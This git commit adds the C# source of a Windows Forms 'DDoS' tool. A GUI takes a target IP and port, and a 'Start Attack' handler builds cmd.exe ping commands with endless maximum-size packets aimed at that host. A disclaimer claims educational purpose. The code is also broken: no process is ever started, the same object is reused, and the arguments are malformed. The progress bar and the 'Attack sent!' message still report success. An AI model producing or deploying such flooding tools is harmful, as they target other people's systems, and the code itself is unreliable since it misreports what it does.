299b159528034242e67c26304d345067da867d93
TheTeamHackFR <104196752+Th3Te4mH4ckFR@users.noreply.github.com>
2022-04-25 14:23:45 +0200

    Add files via upload

---
+++ TheTeamHackFR DDoS/TheTeamHackFR DDoS/Form1.Designer.cs
@@ -0,0 +1,267 @@
+﻿
+namespace TheTeamHackFR_DDoS
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variable nécessaire au concepteur.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Nettoyage des ressources utilisées.
+        /// </summary>
+        /// <param name="disposing">true si les ressources managées doivent être supprimées ; sinon, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Code généré par le Concepteur Windows Form
+
+        /// <summary>
+        /// Méthode requise pour la prise en charge du concepteur - ne modifiez pas
+        /// le contenu de cette méthode avec l'éditeur de code.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            this.label2 = new System.Windows.Forms.Label();
+            this.ADRESSEIP = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.PORTDELIP = new System.Windows.Forms.TextBox();
+            this.button3 = new System.Windows.Forms.Button();
+            this.button4 = new System.Windows.Forms.Button();
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label6 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.panel1.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Location = new System.Drawing.Point(770, 0);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(30, 30);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "X";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12.25F);
+            this.button2.Location = new System.Drawing.Point(734, 0);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(30, 30);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "-";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(44, 20);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(117, 13);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "TheTeamHackFR DoS";
+            // 
+            // notifyIcon1
+            // 
+            this.notifyIcon1.Text = "notifyIcon1";
+            this.notifyIcon1.Visible = true;
+            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F);
+            this.label2.Location = new System.Drawing.Point(33, 67);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(162, 31);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "IP Address: ";
+            // 
+            // ADRESSEIP
+            // 
+            this.ADRESSEIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F);
+            this.ADRESSEIP.ForeColor = System.Drawing.Color.White;
+            this.ADRESSEIP.Location = new System.Drawing.Point(201, 67);
+            this.ADRESSEIP.Name = "ADRESSEIP";
+            this.ADRESSEIP.Size = new System.Drawing.Size(201, 38);
+            this.ADRESSEIP.TabIndex = 4;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F);
+            this.label3.Location = new System.Drawing.Point(439, 70);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(190, 31);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Port to attack: ";
+            // 
+            // PORTDELIP
+            // 
+            this.PORTDELIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F);
+            this.PORTDELIP.ForeColor = System.Drawing.Color.White;
+            this.PORTDELIP.Location = new System.Drawing.Point(635, 67);
+            this.PORTDELIP.Name = "PORTDELIP";
+            this.PORTDELIP.Size = new System.Drawing.Size(97, 38);
+            this.PORTDELIP.TabIndex = 6;
+            // 
+            // button3
+            // 
+            this.button3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
+            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.Location = new System.Drawing.Point(587, 395);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(201, 43);
+            this.button3.TabIndex = 7;
+            this.button3.Text = "Start Attack";
+            this.button3.UseVisualStyleBackColor = false;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // button4
+            // 
+            this.button4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
+            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button4.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button4.Location = new System.Drawing.Point(12, 395);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(201, 43);
+            this.button4.TabIndex = 8;
+            this.button4.Text = "Stop Attack";
+            this.button4.UseVisualStyleBackColor = false;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Location = new System.Drawing.Point(219, 395);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(362, 43);
+            this.progressBar1.Style = System.Windows.Forms.ProgressBarStyle.Continuous;
+            this.progressBar1.TabIndex = 9;
+            // 
+            // panel1
+            // 
+            this.panel1.Controls.Add(this.pictureBox1);
+            this.panel1.Controls.Add(this.label1);
+            this.panel1.Location = new System.Drawing.Point(1, -10);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(731, 40);
+            this.panel1.TabIndex = 10;
+            this.panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.panel1_Paint);
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F);
+            this.label4.Location = new System.Drawing.Point(28, 194);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(552, 31);
+            this.label4.TabIndex = 11;
+            this.label4.Text = "This tool is made for education purpose only!";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F);
+            this.label5.Location = new System.Drawing.Point(28, 225);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(328, 31);
+            this.label5.TabIndex = 12;
+            this.label5.Text = "Dont\' use it to arm peaple!";
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F);
+            this.label6.Location = new System.Drawing.Point(28, 256);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(439, 31);
+            this.label6.TabIndex = 13;
+            this.label6.Text = "We\'re not responsable of your acts!";
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(3, 10);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(35, 30);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 14;
+            this.pictureBox1.TabStop = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.panel1);
+            this.Controls.Add(this.progressBar1);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.PORTDELIP);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.ADRESSEIP);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.ForeColor = System.Drawing.Color.White;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "TheTeamHackFR DoS";
+            this.panel1.ResumeLayout(false);
+            this.panel1.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox ADRESSEIP;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox PORTDELIP;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ TheTeamHackFR DDoS/TheTeamHackFR DDoS/Form1.cs
@@ -0,0 +1,119 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+using System.Diagnostics;
+
+namespace TheTeamHackFR_DDoS
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            WindowState = FormWindowState.Minimized;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("Thank for using TheTeamHackFR DoS, By TheTeamHackFR!");
+            this.Close();
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            NotifyIcon trayIcon = new NotifyIcon();
+            trayIcon.Icon = new Icon(@"C:\csharp.ico");
+            trayIcon.Text = "TheTeamHackFR DDoS";
+            trayIcon.Visible = true;
+            trayIcon.ShowBalloonTip(2000, "TheTeamHackFR DDoS", "Window minimized!", ToolTipIcon.Info);
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            string IPTODDOS = ADRESSEIP.Text;
+            Process  proc = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +10;
+            Thread.Sleep(1000);
+            Process proc2 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +20;
+            Thread.Sleep(1000);
+            Process proc3 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +30;
+            Thread.Sleep(1000);
+            Process proc4 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +40;
+            Thread.Sleep(1000);
+            Process proc5 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +50;
+            Thread.Sleep(1000);
+            Process proc6 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +60;
+            Thread.Sleep(1000);
+            Process proc7 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +70;
+            Thread.Sleep(1000);
+            Process proc8 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +80;
+            Thread.Sleep(1000);
+            Process proc9 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +90;
+            Thread.Sleep(1000);
+            Process proc100 = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "ping " + IPTODDOS + "-t -l 65500";
+            proc.StartInfo.UseShellExecute = false;
+            progressBar1.Value = +100;
+            Thread.Sleep(1000);
+            MessageBox.Show("Attack sent!");
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            progressBar1.Value = +0;
+            MessageBox.Show("Attack stopped!");
+        }
+
+        private void panel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+    }
+}
